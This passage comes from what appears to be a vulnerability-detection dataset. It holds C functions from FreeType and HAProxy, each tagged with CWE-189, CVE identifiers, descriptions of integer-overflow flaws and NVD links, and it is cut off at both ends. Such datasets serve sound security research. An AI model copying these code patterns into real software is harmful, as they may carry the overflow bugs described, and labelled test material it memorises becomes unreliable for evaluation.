4;\n      decoder->strike_index_count = FT_NEXT_ULONG( p );\n       p                          += 34;\n       decoder->bit_depth          = *p;\n \n      /* decoder->strike_index_array +                               */\n      /*   8 * decoder->strike_index_count > face->sbit_table_size ? */\n      if ( decoder->strike_index_array > face->sbit_table_size           ||\n           decoder->strike_index_count >\n             ( face->sbit_table_size - decoder->strike_index_array ) / 8 )\n         error = FT_THROW( Invalid_File_Format );\n     }\n  }\n", "func_hash": 318862796718235578447679874450835905734, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9666", "cve_desc": "The tt_sbit_decoder_init function in sfnt/ttsbit.c in FreeType before 2.5.4 proceeds with a count-to-size association without restricting the count value, which allows remote attackers to cause a denial of service (integer overflow and out-of-bounds read) or possibly have unspecified other impact via a crafted embedded bitmap.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9666"}
{"idx": 158115, "project": "haproxy", "commit_id": "b4d05093bc89f71377230228007e69a1434c1a0c", "project_url": "https://github.com/haproxy/haproxy", "commit_url": "https://git.haproxy.org/?p=haproxy-1.5.git;a=commitdiff;h=b4d05093bc89f71377230228007e69a1434c1a0c", "commit_message": "None", "target": 0, "func": "int http_request_forward_body(struct session *s, struct channel *req, int an_bit)\n{\n\tstruct http_txn *txn = &s->txn;\n\tstruct http_msg *msg = &s->txn.req;\n\n\tif (unlikely(msg->msg_state < HTTP_MSG_BODY))\n\t\treturn 0;\n\n\tif ((req->flags & (CF_READ_ERROR|CF_READ_TIMEOUT|CF_WRITE_ERROR|CF_WRITE_TIMEOUT)) ||\n\t    ((req->flags & CF_SHUTW) && (req->to_forward || req->buf->o))) {\n\t\t/* Output closed while we were sending data. We must abort and\n\t\t * wake the other side up.\n\t\t */\n\t\tmsg->msg_state = HTTP_MSG_ERROR;\n\t\thttp_resync_states(s);\n\t\treturn 1;\n\t}\n\n\t/* Note that we don't have to send 100-continue back because we don't\n\t * need the data to complete our job, and it's up to the server to\n\t * decide whether to return 100, 417 or anything else in return of\n\t * an \"Expect: 100-continue\" header.\n\t */\n\n\tif (msg->sov > 0) {\n\t\t/* we have msg->sov which points to the first byte of message\n\t\t * body, and req->buf.p still points to the beginning of the\n\t\t * message. We forward the headers now, as we don't need them\n\t\t * anymore, and we want to flush them.\n\t\t */\n\t\tb_adv(req->buf, msg->sov);\n\t\tmsg->next -= msg->sov;\n\t\tmsg->sov = 0;\n\n\t\t/* The previous analysers guarantee that the state is somewhere\n\t\t * between MSG_BODY and the first MSG_DATA. So msg->sol and\n\t\t * msg->next are always correct.\n\t\t */\n\t\tif (msg->msg_state < HTTP_MSG_CHUNK_SIZE) {\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_SIZE;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DATA;\n\t\t}\n\t}\n\n\t/* Some post-connect processing might want us to refrain from starting to\n\t * forward data. Currently, the only reason for this is \"balance url_param\"\n\t * whichs need to parse/process the request after we've enabled forwarding.\n\t */\n\tif (unlikely(msg->flags & HTTP_MSGF_WAIT_CONN)) {\n\t\tif (!(s->rep->flags & CF_READ_ATTACHED)) {\n\t\t\tchannel_auto_connect(req);\n\t\t\treq->flags |= CF_WAKE_CONNECT;\n\t\t\tgoto missing_data;\n\t\t}\n\t\tmsg->flags &= ~HTTP_MSGF_WAIT_CONN;\n\t}\n\n\t/* in most states, we should abort in case of early close */\n\tchannel_auto_close(req);\n\n\tif (req->to_forward) {\n\t\t/* We can't process the buffer's contents yet */\n\t\treq->flags |= CF_WAKE_WRITE;\n\t\tgoto missing_data;\n\t}\n\n\twhile (1) {\n\t\tif (msg->msg_state == HTTP_MSG_DATA) {\n\t\t\t/* must still forward */\n\t\t\t/* we may have some pending data starting at req->buf->p */\n\t\t\tif (msg->chunk_len > req->buf->i - msg->next) {\n\t\t\t\treq->flags |= CF_WAKE_WRITE;\n\t\t\t\tgoto missing_data;\n\t\t\t}\n\t\t\tmsg->next += msg->chunk_len;\n\t\t\tmsg->chunk_len = 0;\n\n\t\t\t/* nothing left to forward */\n\t\t\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\t\t\tmsg->msg_state = HTTP_MSG_CHUNK_CRLF;\n\t\t\telse\n\t\t\t\tmsg->msg_state = HTTP_MSG_DONE;\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_SIZE) {\n\t\t\t/* read the chunk size and assign it to ->chunk_len, then\n\t\t\t * set ->next to point to the body and switch to DATA or\n\t\t\t * TRAILERS state.\n\t\t\t */\n\t\t\tint ret = http_parse_chunk_size(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_SIZE, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* otherwise we're in HTTP_MSG_DATA or HTTP_MSG_TRAILERS state */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_CHUNK_CRLF) {\n\t\t\t/* we want the CRLF after the data */\n\t\t\tint ret = http_skip_chunk_crlf(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_CHUNK_CRLF, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in MSG_CHUNK_SIZE now */\n\t\t}\n\t\telse if (msg->msg_state == HTTP_MSG_TRAILERS) {\n\t\t\tint ret = http_forward_trailers(msg);\n\n\t\t\tif (ret == 0)\n\t\t\t\tgoto missing_data;\n\t\t\telse if (ret < 0) {\n\t\t\t\tsession_inc_http_err_ctr(s);\n\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, HTTP_MSG_TRAILERS, s->be);\n\t\t\t\tgoto return_bad_req;\n\t\t\t}\n\t\t\t/* we're in HTTP_MSG_DONE now */\n\t\t}\n\t\telse {\n\t\t\tint old_state = msg->msg_state;\n\n\t\t\t/* other states, DONE...TUNNEL */\n\n\t\t\t/* we may have some pending data starting at req->buf->p\n                         * such as last chunk of data or trailers.\n                         */\n                        b_adv(req->buf, msg->next);\n                       if (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n                                msg->sov -= msg->next;\n                        msg->next = 0;\n \n\t\t\t/* for keep-alive we don't want to forward closes on DONE */\n\t\t\tif ((txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_KAL ||\n\t\t\t    (txn->flags & TX_CON_WANT_MSK) == TX_CON_WANT_SCL)\n\t\t\t\tchannel_dont_close(req);\n\t\t\tif (http_resync_states(s)) {\n\t\t\t\t/* some state changes occurred, maybe the analyser\n\t\t\t\t * was disabled too.\n\t\t\t\t */\n\t\t\t\tif (unlikely(msg->msg_state == HTTP_MSG_ERROR)) {\n\t\t\t\t\tif (req->flags & CF_SHUTW) {\n\t\t\t\t\t\t/* request errors are most likely due to\n\t\t\t\t\t\t * the server aborting the transfer.\n\t\t\t\t\t\t */\n\t\t\t\t\t\tgoto aborted_xfer;\n\t\t\t\t\t}\n\t\t\t\t\tif (msg->err_pos >= 0)\n\t\t\t\t\t\thttp_capture_bad_message(&s->fe->invalid_req, s, msg, old_state, s->be);\n\t\t\t\t\tgoto return_bad_req;\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\t/* If \"option abortonclose\" is set on the backend, we\n\t\t\t * want to monitor the client's connection and forward\n\t\t\t * any shutdown notification to the server, which will\n\t\t\t * decide whether to close or to go on processing the\n\t\t\t * request.\n\t\t\t */\n\t\t\tif (s->be->options & PR_O_ABRT_CLOSE) {\n\t\t\t\tchannel_auto_read(req);\n\t\t\t\tchannel_auto_close(req);\n\t\t\t}\n\t\t\telse if (s->txn.meth == HTTP_METH_POST) {\n\t\t\t\t/* POST requests may require to read extra CRLF\n\t\t\t\t * sent by broken browsers and which could cause\n\t\t\t\t * an RST to be sent upon close on some systems\n\t\t\t\t * (eg: Linux).\n\t\t\t\t */\n\t\t\t\tchannel_auto_read(req);\n\t\t\t}\n\n\t\t\treturn 0;\n\t\t}\n\t}\n\n  missing_data:\n        /* we may have some pending data starting at req->buf->p */\n        b_adv(req->buf, msg->next);\n       if (unlikely(!(s->req->flags & CF_WROTE_DATA)))\n                msg->sov -= msg->next + MIN(msg->chunk_len, req->buf->i);\n \n        msg->next = 0;\n\tmsg->chunk_len -= channel_forward(req, msg->chunk_len);\n\n\t/* stop waiting for data if the input is closed before the end */\n\tif (req->flags & CF_SHUTR) {\n\t\tif (!(s->flags & SN_ERR_MASK))\n\t\t\ts->flags |= SN_ERR_CLICL;\n\t\tif (!(s->flags & SN_FINST_MASK)) {\n\t\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\t\ts->flags |= SN_FINST_H;\n\t\t\telse\n\t\t\t\ts->flags |= SN_FINST_D;\n\t\t}\n\n\t\ts->fe->fe_counters.cli_aborts++;\n\t\ts->be->be_counters.cli_aborts++;\n\t\tif (objt_server(s->target))\n\t\t\tobjt_server(s->target)->counters.cli_aborts++;\n\n\t\tgoto return_bad_req_stats_ok;\n\t}\n\n\t/* waiting for the last bits to leave the buffer */\n\tif (req->flags & CF_SHUTW)\n\t\tgoto aborted_xfer;\n\n\t/* When TE: chunked is used, we need to get there again to parse remaining\n\t * chunks even if the client has closed, so we don't want to set CF_DONTCLOSE.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\tchannel_dont_close(req);\n\n\t/* We know that more data are expected, but we couldn't send more that\n\t * what we did. So we always set the CF_EXPECT_MORE flag so that the\n\t * system knows it must not set a PUSH on this first part. Interactive\n\t * modes are already handled by the stream sock layer. We must not do\n\t * this in content-length mode because it could present the MSG_MORE\n\t * flag with the last block of forwarded data, which would cause an\n\t * additional delay to be observed by the receiver.\n\t */\n\tif (msg->flags & HTTP_MSGF_TE_CHNK)\n\t\treq->flags |= CF_EXPECT_MORE;\n\n\treturn 0;\n\n return_bad_req: /* let's centralize all bad requests */\n\ts->fe->fe_counters.failed_req++;\n\tif (s->listener->counters)\n\t\ts->listener->counters->failed_req++;\n\n return_bad_req_stats_ok:\n\t/* we may have some pending data starting at req->buf->p */\n\tb_adv(req->buf, msg->next);\n\tmsg->next = 0;\n\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 400;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_400));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_PRXCOND;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n\n aborted_xfer:\n\ttxn->req.msg_state = HTTP_MSG_ERROR;\n\tif (txn->status) {\n\t\t/* Note: we don't send any error if some data were already sent */\n\t\tstream_int_retnclose(req->prod, NULL);\n\t} else {\n\t\ttxn->status = 502;\n\t\tstream_int_retnclose(req->prod, http_error_message(s, HTTP_ERR_502));\n\t}\n\treq->analysers = 0;\n\ts->rep->analysers = 0; /* we're in data phase, we want to abort both directions */\n\n\ts->fe->fe_counters.srv_aborts++;\n\ts->be->be_counters.srv_aborts++;\n\tif (objt_server(s->target))\n\t\tobjt_server(s->target)->counters.srv_aborts++;\n\n\tif (!(s->flags & SN_ERR_MASK))\n\t\ts->flags |= SN_ERR_SRVCL;\n\tif (!(s->flags & SN_FINST_MASK)) {\n\t\tif (txn->rsp.msg_state < HTTP_MSG_ERROR)\n\t\t\ts->flags |= SN_FINST_H;\n\t\telse\n\t\t\ts->flags |= SN_FINST_D;\n\t}\n\treturn 0;\n}\n", "func_hash": 232911459327632823261392605236293767883, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-6269", "cve_desc": "Multiple integer overflows in the http_request_forward_body function in proto_http.c in HAProxy 1.5-dev23 before 1.5.4 allow remote attackers to cause a denial of service (crash) via a large stream of data, which triggers a buffer overflow and an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6269"}
{"idx": 158124, "project": "savannah", "commit_id": "6305b869d86ff415a33576df6d43729673c66eee", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6305b869d86ff415a33576df6d43729673c66eee", "commit_message": "None", "target": 0, "func": "  gray_render_span( int             y,\n                    int             count,\n                    const FT_Span*  spans,\n                    PWorker         worker )\n  {\n    unsigned char*  p;\n    FT_Bitmap*      map = &worker->target;\n\n\n     /* first of all, compute the scanline offset */\n     p = (unsigned char*)map->buffer - y * map->pitch;\n     if ( map->pitch >= 0 )\n      p += (unsigned)( ( map->rows - 1 ) * map->pitch );\n \n     for ( ; count > 0; count--, spans++ )\n     {\n      unsigned char  coverage = spans->coverage;\n\n\n      if ( coverage )\n      {\n        /* For small-spans it is faster to do it by ourselves than\n         * calling `memset'.  This is mainly due to the cost of the\n         * function call.\n         */\n        if ( spans->len >= 8 )\n          FT_MEM_SET( p + spans->x, (unsigned char)coverage, spans->len );\n        else\n        {\n          unsigned char*  q = p + spans->x;\n\n\n          switch ( spans->len )\n          {\n          case 7: *q++ = (unsigned char)coverage;\n          case 6: *q++ = (unsigned char)coverage;\n          case 5: *q++ = (unsigned char)coverage;\n          case 4: *q++ = (unsigned char)coverage;\n          case 3: *q++ = (unsigned char)coverage;\n          case 2: *q++ = (unsigned char)coverage;\n          case 1: *q   = (unsigned char)coverage;\n          default:\n            ;\n          }\n        }\n      }\n    }\n  }\n", "func_hash": 34358703453298665322690073547254403786, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2010-2500", "cve_desc": "Integer overflow in the gray_render_span function in smooth/ftgrays.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2500"}
{"idx": 158128, "project": "savannah", "commit_id": "7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "commit_message": "None", "target": 0, "func": "  cff_decoder_parse_charstrings( CFF_Decoder*  decoder,\n                                 FT_Byte*      charstring_base,\n                                 FT_ULong      charstring_len )\n  {\n    FT_Error           error;\n    CFF_Decoder_Zone*  zone;\n    FT_Byte*           ip;\n    FT_Byte*           limit;\n    CFF_Builder*       builder = &decoder->builder;\n    FT_Pos             x, y;\n    FT_Fixed           seed;\n    FT_Fixed*          stack;\n    FT_Int             charstring_type =\n                         decoder->cff->top_font.font_dict.charstring_type;\n\n    T2_Hints_Funcs     hinter;\n\n\n    /* set default width */\n    decoder->num_hints  = 0;\n    decoder->read_width = 1;\n\n    /* compute random seed from stack address of parameter */\n    seed = (FT_Fixed)( ( (FT_PtrDist)(char*)&seed              ^\n                         (FT_PtrDist)(char*)&decoder           ^\n                         (FT_PtrDist)(char*)&charstring_base ) &\n                         FT_ULONG_MAX ) ;\n    seed = ( seed ^ ( seed >> 10 ) ^ ( seed >> 20 ) ) & 0xFFFFL;\n    if ( seed == 0 )\n      seed = 0x7384;\n\n    /* initialize the decoder */\n    decoder->top  = decoder->stack;\n    decoder->zone = decoder->zones;\n    zone          = decoder->zones;\n    stack         = decoder->top;\n\n    hinter = (T2_Hints_Funcs)builder->hints_funcs;\n\n    builder->path_begun = 0;\n\n    zone->base           = charstring_base;\n    limit = zone->limit  = charstring_base + charstring_len;\n    ip    = zone->cursor = zone->base;\n\n    error = CFF_Err_Ok;\n\n    x = builder->pos_x;\n    y = builder->pos_y;\n\n    /* begin hints recording session, if any */\n    if ( hinter )\n      hinter->open( hinter->hints );\n\n    /* now execute loop */\n    while ( ip < limit )\n    {\n      CFF_Operator  op;\n      FT_Byte       v;\n\n\n      /********************************************************************/\n      /*                                                                  */\n      /* Decode operator or operand                                       */\n      /*                                                                  */\n      v = *ip++;\n      if ( v >= 32 || v == 28 )\n      {\n        FT_Int    shift = 16;\n        FT_Int32  val;\n\n\n        /* this is an operand, push it on the stack */\n        if ( v == 28 )\n        {\n          if ( ip + 1 >= limit )\n            goto Syntax_Error;\n          val = (FT_Short)( ( (FT_Short)ip[0] << 8 ) | ip[1] );\n          ip += 2;\n        }\n        else if ( v < 247 )\n          val = (FT_Int32)v - 139;\n        else if ( v < 251 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)v - 247 ) * 256 + *ip++ + 108;\n        }\n        else if ( v < 255 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = -( (FT_Int32)v - 251 ) * 256 - *ip++ - 108;\n        }\n        else\n        {\n          if ( ip + 3 >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)ip[0] << 24 ) |\n                ( (FT_Int32)ip[1] << 16 ) |\n                ( (FT_Int32)ip[2] <<  8 ) |\n                            ip[3];\n          ip    += 4;\n          if ( charstring_type == 2 )\n            shift = 0;\n        }\n        if ( decoder->top - stack >= CFF_MAX_OPERANDS )\n          goto Stack_Overflow;\n\n        val           <<= shift;\n        *decoder->top++ = val;\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n        if ( !( val & 0xFFFFL ) )\n          FT_TRACE4(( \" %ld\", (FT_Int32)( val >> 16 ) ));\n        else\n          FT_TRACE4(( \" %.2f\", val / 65536.0 ));\n#endif\n\n      }\n      else\n      {\n        /* The specification says that normally arguments are to be taken */\n        /* from the bottom of the stack.  However, this seems not to be   */\n        /* correct, at least for Acroread 7.0.8 on GNU/Linux: It pops the */\n        /* arguments similar to a PS interpreter.                         */\n\n        FT_Fixed*  args     = decoder->top;\n        FT_Int     num_args = (FT_Int)( args - decoder->stack );\n        FT_Int     req_args;\n\n\n        /* find operator */\n        op = cff_op_unknown;\n\n        switch ( v )\n        {\n        case 1:\n          op = cff_op_hstem;\n          break;\n        case 3:\n          op = cff_op_vstem;\n          break;\n        case 4:\n          op = cff_op_vmoveto;\n          break;\n        case 5:\n          op = cff_op_rlineto;\n          break;\n        case 6:\n          op = cff_op_hlineto;\n          break;\n        case 7:\n          op = cff_op_vlineto;\n          break;\n        case 8:\n          op = cff_op_rrcurveto;\n          break;\n        case 9:\n          op = cff_op_closepath;\n          break;\n        case 10:\n          op = cff_op_callsubr;\n          break;\n        case 11:\n          op = cff_op_return;\n          break;\n        case 12:\n          {\n            if ( ip >= limit )\n              goto Syntax_Error;\n            v = *ip++;\n\n            switch ( v )\n            {\n            case 0:\n              op = cff_op_dotsection;\n              break;\n            case 1: /* this is actually the Type1 vstem3 operator */\n              op = cff_op_vstem;\n              break;\n            case 2: /* this is actually the Type1 hstem3 operator */\n              op = cff_op_hstem;\n              break;\n            case 3:\n              op = cff_op_and;\n              break;\n            case 4:\n              op = cff_op_or;\n              break;\n            case 5:\n              op = cff_op_not;\n              break;\n            case 6:\n              op = cff_op_seac;\n              break;\n            case 7:\n              op = cff_op_sbw;\n              break;\n            case 8:\n              op = cff_op_store;\n              break;\n            case 9:\n              op = cff_op_abs;\n              break;\n            case 10:\n              op = cff_op_add;\n              break;\n            case 11:\n              op = cff_op_sub;\n              break;\n            case 12:\n              op = cff_op_div;\n              break;\n            case 13:\n              op = cff_op_load;\n              break;\n            case 14:\n              op = cff_op_neg;\n              break;\n            case 15:\n              op = cff_op_eq;\n              break;\n            case 16:\n              op = cff_op_callothersubr;\n              break;\n            case 17:\n              op = cff_op_pop;\n              break;\n            case 18:\n              op = cff_op_drop;\n              break;\n            case 20:\n              op = cff_op_put;\n              break;\n            case 21:\n              op = cff_op_get;\n              break;\n            case 22:\n              op = cff_op_ifelse;\n              break;\n            case 23:\n              op = cff_op_random;\n              break;\n            case 24:\n              op = cff_op_mul;\n              break;\n            case 26:\n              op = cff_op_sqrt;\n              break;\n            case 27:\n              op = cff_op_dup;\n              break;\n            case 28:\n              op = cff_op_exch;\n              break;\n            case 29:\n              op = cff_op_index;\n              break;\n            case 30:\n              op = cff_op_roll;\n              break;\n            case 33:\n              op = cff_op_setcurrentpoint;\n              break;\n            case 34:\n              op = cff_op_hflex;\n              break;\n            case 35:\n              op = cff_op_flex;\n              break;\n            case 36:\n              op = cff_op_hflex1;\n              break;\n            case 37:\n              op = cff_op_flex1;\n              break;\n            default:\n              /* decrement ip for syntax error message */\n              ip--;\n            }\n          }\n          break;\n        case 13:\n          op = cff_op_hsbw;\n          break;\n        case 14:\n          op = cff_op_endchar;\n          break;\n        case 16:\n          op = cff_op_blend;\n          break;\n        case 18:\n          op = cff_op_hstemhm;\n          break;\n        case 19:\n          op = cff_op_hintmask;\n          break;\n        case 20:\n          op = cff_op_cntrmask;\n          break;\n        case 21:\n          op = cff_op_rmoveto;\n          break;\n        case 22:\n          op = cff_op_hmoveto;\n          break;\n        case 23:\n          op = cff_op_vstemhm;\n          break;\n        case 24:\n          op = cff_op_rcurveline;\n          break;\n        case 25:\n          op = cff_op_rlinecurve;\n          break;\n        case 26:\n          op = cff_op_vvcurveto;\n          break;\n        case 27:\n          op = cff_op_hhcurveto;\n          break;\n        case 29:\n          op = cff_op_callgsubr;\n          break;\n        case 30:\n          op = cff_op_vhcurveto;\n          break;\n        case 31:\n          op = cff_op_hvcurveto;\n          break;\n        default:\n          break;\n        }\n\n        if ( op == cff_op_unknown )\n          goto Syntax_Error;\n\n        /* check arguments */\n        req_args = cff_argument_counts[op];\n        if ( req_args & CFF_COUNT_CHECK_WIDTH )\n        {\n          if ( num_args > 0 && decoder->read_width )\n          {\n            /* If `nominal_width' is non-zero, the number is really a      */\n            /* difference against `nominal_width'.  Else, the number here  */\n            /* is truly a width, not a difference against `nominal_width'. */\n            /* If the font does not set `nominal_width', then              */\n            /* `nominal_width' defaults to zero, and so we can set         */\n            /* `glyph_width' to `nominal_width' plus number on the stack   */\n            /* -- for either case.                                         */\n\n            FT_Int  set_width_ok;\n\n\n            switch ( op )\n            {\n            case cff_op_hmoveto:\n            case cff_op_vmoveto:\n              set_width_ok = num_args & 2;\n              break;\n\n            case cff_op_hstem:\n            case cff_op_vstem:\n            case cff_op_hstemhm:\n            case cff_op_vstemhm:\n            case cff_op_rmoveto:\n            case cff_op_hintmask:\n            case cff_op_cntrmask:\n              set_width_ok = num_args & 1;\n              break;\n\n            case cff_op_endchar:\n              /* If there is a width specified for endchar, we either have */\n              /* 1 argument or 5 arguments.  We like to argue.             */\n              set_width_ok = ( num_args == 5 ) || ( num_args == 1 );\n              break;\n\n            default:\n              set_width_ok = 0;\n              break;\n            }\n\n            if ( set_width_ok )\n            {\n              decoder->glyph_width = decoder->nominal_width +\n                                       ( stack[0] >> 16 );\n\n              if ( decoder->width_only )\n              {\n                /* we only want the advance width; stop here */\n                break;\n              }\n\n              /* Consumed an argument. */\n              num_args--;\n            }\n          }\n\n          decoder->read_width = 0;\n          req_args            = 0;\n        }\n\n        req_args &= 0x000F;\n        if ( num_args < req_args )\n          goto Stack_Underflow;\n        args     -= req_args;\n        num_args -= req_args;\n\n        /* At this point, `args' points to the first argument of the  */\n        /* operand in case `req_args' isn't zero.  Otherwise, we have */\n        /* to adjust `args' manually.                                 */\n\n        /* Note that we only pop arguments from the stack which we    */\n        /* really need and can digest so that we can continue in case */\n        /* of superfluous stack elements.                             */\n\n        switch ( op )\n        {\n        case cff_op_hstem:\n        case cff_op_vstem:\n        case cff_op_hstemhm:\n        case cff_op_vstemhm:\n          /* the number of arguments is always even here */\n          FT_TRACE4((\n              op == cff_op_hstem   ? \" hstem\\n\"   :\n            ( op == cff_op_vstem   ? \" vstem\\n\"   :\n            ( op == cff_op_hstemhm ? \" hstemhm\\n\" : \" vstemhm\\n\" ) ) ));\n\n          if ( hinter )\n            hinter->stems( hinter->hints,\n                           ( op == cff_op_hstem || op == cff_op_hstemhm ),\n                           num_args / 2,\n                           args - ( num_args & ~1 ) );\n\n          decoder->num_hints += num_args / 2;\n          args = stack;\n          break;\n\n        case cff_op_hintmask:\n        case cff_op_cntrmask:\n          FT_TRACE4(( op == cff_op_hintmask ? \" hintmask\" : \" cntrmask\" ));\n\n          /* implement vstem when needed --                        */\n          /* the specification doesn't say it, but this also works */\n          /* with the 'cntrmask' operator                          */\n          /*                                                       */\n          if ( num_args > 0 )\n          {\n            if ( hinter )\n              hinter->stems( hinter->hints,\n                             0,\n                             num_args / 2,\n                             args - ( num_args & ~1 ) );\n\n            decoder->num_hints += num_args / 2;\n          }\n\n          if ( hinter )\n          {\n            if ( op == cff_op_hintmask )\n              hinter->hintmask( hinter->hints,\n                                builder->current->n_points,\n                                decoder->num_hints,\n                                ip );\n            else\n              hinter->counter( hinter->hints,\n                               decoder->num_hints,\n                               ip );\n          }\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n          {\n            FT_UInt maskbyte;\n\n\n            FT_TRACE4(( \" (maskbytes: \" ));\n\n            for ( maskbyte = 0;\n                  maskbyte < (FT_UInt)(( decoder->num_hints + 7 ) >> 3);\n                  maskbyte++, ip++ )\n              FT_TRACE4(( \"0x%02X\", *ip ));\n\n            FT_TRACE4(( \")\\n\" ));\n          }\n#else\n          ip += ( decoder->num_hints + 7 ) >> 3;\n#endif\n          if ( ip >= limit )\n            goto Syntax_Error;\n          args = stack;\n          break;\n\n        case cff_op_rmoveto:\n          FT_TRACE4(( \" rmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-2];\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_vmoveto:\n          FT_TRACE4(( \" vmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_hmoveto:\n          FT_TRACE4(( \" hmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_rlineto:\n          FT_TRACE4(( \" rlineto\\n\" ));\n\n          if ( cff_builder_start_point ( builder, x, y ) ||\n               check_points( builder, num_args / 2 )     )\n            goto Fail;\n\n          if ( num_args < 2 )\n            goto Stack_Underflow;\n\n          args -= num_args & ~1;\n          while ( args < decoder->top )\n          {\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args += 2;\n          }\n          args = stack;\n          break;\n\n        case cff_op_hlineto:\n        case cff_op_vlineto:\n          {\n            FT_Int  phase = ( op == cff_op_hlineto );\n\n\n            FT_TRACE4(( op == cff_op_hlineto ? \" hlineto\\n\"\n                                             : \" vlineto\\n\" ));\n\n            if ( num_args < 1 )\n              goto Stack_Underflow;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_args )         )\n              goto Fail;\n\n            args = stack;\n            while ( args < decoder->top )\n            {\n              if ( phase )\n                x += args[0];\n              else\n                y += args[0];\n\n              if ( cff_builder_add_point1( builder, x, y ) )\n                goto Fail;\n\n              args++;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rrcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rrcurveto\\n\" ));\n\n            if ( num_args < 6 )\n              goto Stack_Underflow;\n\n            nargs = num_args - num_args % 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, nargs / 2 )     )\n              goto Fail;\n\n            args -= nargs;\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vvcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" vvcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n\n            if ( nargs & 1 )\n            {\n              x += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              y += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_hhcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" 